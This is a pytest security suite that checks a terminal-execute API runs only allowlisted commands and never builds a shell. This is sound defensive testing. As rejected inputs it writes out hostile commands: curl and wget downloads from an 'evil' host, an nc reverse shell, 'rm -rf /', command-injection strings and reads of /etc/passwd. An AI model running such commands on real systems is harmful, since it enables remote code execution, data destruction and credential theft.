"""/v1/terminal/execute must run registered commands only, and never via a shell.

The old design screened a raw command string against a denylist of shell
metacharacters and then ran it with `shell=True`. These tests pin down both
halves of what replaced it:

* the denylist's blind spot — a command with no metacharacters at all was
  accepted and executed, so "no injection" never meant "no arbitrary execution";
* the shell itself is gone, so there is nothing left to inject into.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from windows_os_api.backends.fake import FakeBackend
from windows_os_api.os.terminal.allowlist import (
    CommandRejected,
    registered_commands,
    resolve,
)

pytestmark = pytest.mark.security


# ---------------------------------------------------------------------------
# The registry
# ---------------------------------------------------------------------------
def test_registered_command_resolves_to_an_absolute_argv():
    argv = resolve("whoami")
    assert isinstance(argv, list)
    assert Path(argv[0]).is_absolute(), argv
    # Compare the stem, case-insensitively: on Windows shutil.which returns
    # "C:\\Windows\\system32\\whoami.EXE", so an endswith("whoami") check is a
    # POSIX assumption — and it failed on the windows-latest runner.
    assert Path(argv[0]).stem.lower() == "whoami", argv


def test_the_denylists_blind_spot_is_closed():
    """The case that motivated the change.

    `curl http://evil/x -o /tmp/x` contains no `;`, `&&`, `|`, backtick, `$(`
    or newline — every character the old denylist looked for is absent — so it
    passed the check and executed. Arbitrary execution never required injection.
    """
    with pytest.raises(CommandRejected) as exc:
        resolve("curl http://evil/x -o /tmp/x")
    assert "not in allowlist" in str(exc.value)


@pytest.mark.parametrize(
    "command",
    [
        "bash -c 'id'",
        "sh -c id",
        "python -c 'import os; os.system(\"id\")'",
        "nc -e /bin/sh 10.0.0.1 4444",
        "wget http://evil/x",
        "rm -rf /",
    ],
)
def test_unregistered_commands_are_refused(command):
    with pytest.raises(CommandRejected):
        resolve(command)


@pytest.mark.parametrize(
    "command",
    [
        "whoami; id",
        "whoami && id",
        "whoami | id",
        "whoami `id`",
        "whoami $(id)",
        "whoami\nid",
        # The four the old denylist did NOT cover:
        "whoami & id",
        "whoami > /tmp/out",
        "whoami < /etc/passwd",
        "whoami ~/*",
    ],
)
def test_shell_syntax_never_reaches_a_shell(command):
    """Every one of these is refused — including the four the denylist missed."""
    with pytest.raises(CommandRejected):
        resolve(command)


def test_arguments_beyond_the_declared_maximum_are_refused():
    with pytest.raises(CommandRejected) as exc:
        resolve("whoami extra")
    assert "no arguments" in str(exc.value) or "at most" in str(exc.value)


def test_arguments_must_match_the_declared_pattern():
    """`uname` takes flags, not paths — an argument outside the pattern is refused."""
    if "uname" not in registered_commands():
        pytest.skip("uname not registered on this platform")
    resolve("uname -a")  # the permitted shape
    with pytest.raises(CommandRejected) as exc:
        resolve("uname /etc/passwd")
    assert "rejected" in str(exc.value)


def test_admin_only_commands_need_the_admin_policy():
    admin_only = set(registered_commands(include_admin=True)) - set(registered_commands())
    if not admin_only:
        pytest.skip("no admin-only commands registered on this platform")
    name = sorted(admin_only)[0]
    with pytest.raises(CommandRejected) as exc:
        resolve(name, policy="ALLOW")
    assert "ADMIN" in str(exc.value)


def test_empty_and_unparsable_commands_are_refused():
    with pytest.raises(CommandRejected):
        resolve("   ")
    with pytest.raises(CommandRejected):
        resolve('whoami "unbalanced')


# ---------------------------------------------------------------------------
# Enforcement sits in the backend, so a caller cannot skip it
# ---------------------------------------------------------------------------
def test_backend_refuses_unregistered_command_even_under_admin(tmp_path):
    """ADMIN widens the registry; it does not switch it off."""
    backend = FakeBackend(str(tmp_path))
    result = backend.terminal_execute("rm -rf /", "ADMIN")
    assert result["ok"] is False
    assert result["policy"] == "DENY"


def test_backend_refuses_unregistered_command_under_allow(tmp_path):
    backend = FakeBackend(str(tmp_path))
    result = backend.terminal_execute("curl http://evil/x", "ALLOW")
    assert result["ok"] is False


def test_no_backend_still_builds_a_shell():
    """Structural guard: reintroducing shell=True anywhere in a backend fails here.

    The allowlist only holds while there is no shell to fall back to.
    """
    backends = Path(__file__).resolve().parents[2] / "windows_os_api" / "backends"
    offenders = [
        p.name for p in backends.glob("*.py") if "shell=True" in p.read_text(encoding="utf-8")
    ]
    assert not offenders, f"shell=True reintroduced in: {offenders}"


# ---------------------------------------------------------------------------
# Through the HTTP surface
# ---------------------------------------------------------------------------
def test_api_refuses_an_unregistered_command(client, auth_headers):
    r = client.post(
        "/v1/terminal/execute",
        headers=auth_headers,
        json={"command": "curl http://evil/x -o /tmp/x", "policy": "ALLOW"},
    )
    assert r.json()["ok"] is False


def test_api_still_runs_a_registered_command(client, auth_headers):
    r = client.post(
        "/v1/terminal/execute",
        headers=auth_headers,
        json={"command": "whoami", "policy": "ALLOW"},
    )
    assert r.json()["ok"] is True
